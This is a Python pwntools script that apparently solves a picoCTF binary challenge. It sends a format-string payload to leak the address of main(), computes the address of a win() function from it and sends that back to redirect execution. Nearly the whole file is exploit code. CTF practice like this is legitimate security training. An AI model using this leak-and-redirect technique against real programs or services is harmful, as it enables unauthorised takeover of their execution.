from pwn import *

def exploit(reOrlo):
    if(reOrlo):
        r = remote('rescued-float.picoctf.net', 59995)
        r.recvuntil(':')
        r.sendline(b'%25$lx')
    else:
        context.binary = binary = ELF('./vuln', False)
        r = process()
        r.recvuntil(':')
        r.sendline(b'%23$lx')
    
    mainAddr = int(r.recv(12), 16)
    winAddr = mainAddr - 0x96
    log.info(f'Address of main(): {hex(mainAddr)}')
    log.info(f'Address of win(): {hex(winAddr)}')

    r.recvuntil(': ')
    r.sendline(hex(winAddr))
    r.interactive()

exploit(True)